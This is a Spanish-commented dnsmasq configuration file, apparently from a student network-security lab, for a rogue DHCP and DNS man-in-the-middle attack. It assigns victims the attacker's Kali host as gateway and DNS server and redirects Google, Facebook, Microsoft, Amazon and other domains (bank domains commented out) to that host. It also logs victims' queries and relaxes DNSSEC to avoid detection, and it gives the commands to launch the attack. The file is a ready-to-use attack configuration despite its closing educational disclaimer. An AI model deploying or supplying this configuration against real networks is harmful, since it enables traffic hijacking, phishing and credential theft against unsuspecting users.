# ============================================
# Configuración DNSMasq para DHCP Rogue MITM
# Archivo: dnsmasq_mitm.conf
# Autor: maitecruz23
# Descripción: Configuración de DNSMasq para realizar DNS Spoofing
#              en conjunto con el servidor DHCP Rogue
# Ubicación: /etc/dnsmasq_mitm.conf
# Uso: sudo dnsmasq -C /etc/dnsmasq_mitm.conf -d
# ============================================

# ============================================
# CONFIGURACIÓN BÁSICA
# ============================================

# No leer /etc/resolv.conf del sistema
# Esto evita que DNSMasq use los DNS del sistema
no-resolv

# Servidor DNS upstream para dominios no spoofed
# Estos servidores se usarán para dominios que NO estén en la lista de spoofing
server=8.8.8.8
server=1.1.1.1

# Interfaz de escucha
# DNSMasq solo escuchará en esta interfaz
interface=eth0

# No vincular a otras interfaces
# Asegura que DNSMasq solo funcione en eth0
bind-interfaces

# Dominio local personalizado
# Los clientes recibirán este dominio como sufijo DNS
domain=practica20241165.local

# Expandir nombres de host simples
# "servidor" se expandirá a "servidor.practica20241165.local"
expand-hosts

# ============================================
# CONFIGURACIÓN DHCP
# ============================================

# Rango DHCP (debe coincidir con dhcp_rogue.py)
# Formato: dhcp-range=inicio,fin,tiempo_de_lease
dhcp-range=20.24.116.100,20.24.116.200,12h

# Opciones DHCP personalizadas
# Opción 3: Router (Gateway)
dhcp-option=option:router,20.24.116.2

# Opción 6: DNS Server
dhcp-option=option:dns-server,20.24.116.2

# ============================================
# DNS SPOOFING - Redirecciones Maliciosas
# ============================================

# Redirigir dominios específicos a Kali (20.24.116.2)
# Formato: address=/dominio/ip_destino

# Motores de búsqueda
address=/google.com/20.24.116.2
address=/gooble.com/20.24.116.2
address=/bing.com/20.24.116.2
address=/yahoo.com/20.24.116.2

# Redes sociales
address=/facebook.com/20.24.116.2
address=/instagram.com/20.24.116.2
address=/twitter.com/20.24.116.2
address=/tiktok.com/20.24.116.2
address=/linkedin.com/20.24.116.2
address=/snapchat.com/20.24.116.2

# Servicios de Microsoft
address=/microsoft.com/20.24.116.2
address=/msftncsi.com/20.24.116.2
address=/office.com/20.24.116.2
address=/outlook.com/20.24.116.2
address=/live.com/20.24.116.2

# Servicios de video
address=/youtube.com/20.24.116.2
address=/netflix.com/20.24.116.2
address=/twitch.tv/20.24.116.2

# E-commerce
address=/amazon.com/20.24.116.2
address=/ebay.com/20.24.116.2
address=/mercadolibre.com/20.24.116.2

# Bancos (SOLO EN ENTORNO DE PRUEBAS - NUNCA EN PRODUCCIÓN)
# address=/bancopopular.com.do/20.24.116.2
# address=/banreservas.com/20.24.116.2

# Wildcard para subdominios
# Redirige TODOS los subdominios de estos dominios
address=/.google.com/20.24.116.2
address=/.facebook.com/20.24.116.2
address=/.youtube.com/20.24.116.2
address=/.microsoft.com/20.24.116.2

# ============================================
# LOGGING Y DEBUG
# ============================================

# Registrar todas las consultas DNS
# Esto permite ver qué dominios están consultando las víctimas
log-queries

# Registrar todas las transacciones DHCP
# Útil para debugging del ataque
log-dhcp

# Archivo de log personalizado
# Los logs se guardarán en este archivo
log-facility=/var/log/dnsmasq_mitm.log

# Logs asíncronos (mejora rendimiento)
log-async

# ============================================
# OPTIMIZACIÓN
# ============================================

# No almacenar cache DNS
# Esto asegura que todas las consultas sean procesadas en tiempo real
cache-size=0

# Número máximo de conexiones concurrentes
dns-forward-max=150

# Tamaño del buffer de lectura/escritura
edns-packet-max=4096

# ============================================
# SEGURIDAD ADICIONAL
# ============================================

# No responder a consultas desde fuera de la red local
local-service

# No resolver nombres de host en /etc/hosts
no-hosts

# No leer archivos de configuración adicionales
no-poll

# Deshabilitar DNSSEC (para evitar validaciones)
# DNSSEC podría detectar nuestro spoofing
proxy-dnssec

# ============================================
# CONFIGURACIÓN AVANZADA (OPCIONAL)
# ============================================

# Establecer TTL (Time To Live) bajo para respuestas DNS
# Esto hace que las víctimas consulten DNS más frecuentemente
# min-cache-ttl=0
# max-cache-ttl=0
# neg-ttl=0

# Responder a consultas inversas (PTR)
# Útil para resolver IPs a nombres
# ptr-record=2.116.24.20.in-addr.arpa,kali.practica20241165.local

# ============================================
# NOTAS DE USO
# ============================================

# Para iniciar DNSMasq con esta configuración:
#   sudo dnsmasq -C /etc/dnsmasq_mitm.conf -d
#
# Para iniciar en background (sin debug):
#   sudo dnsmasq -C /etc/dnsmasq_mitm.conf
#
# Para detener DNSMasq:
#   sudo killall dnsmasq
#
# Para ver logs en tiempo real:
#   sudo tail -f /var/log/dnsmasq_mitm.log
#
# Para verificar que DNSMasq está corriendo:
#   ps aux | grep dnsmasq
#
# Para probar desde Windows:
#   nslookup google.com
#   (Debería resolver a 20.24.116.2)

# ============================================
# ADVERTENCIA LEGAL
# ============================================

# Este archivo de configuración es SOLO para fines educativos
# y de pruebas en entornos controlados.
#
# El uso de estas técnicas sin autorización explícita es ILEGAL.
# Úsalo bajo tu propio riesgo y con permiso del propietario de la red.
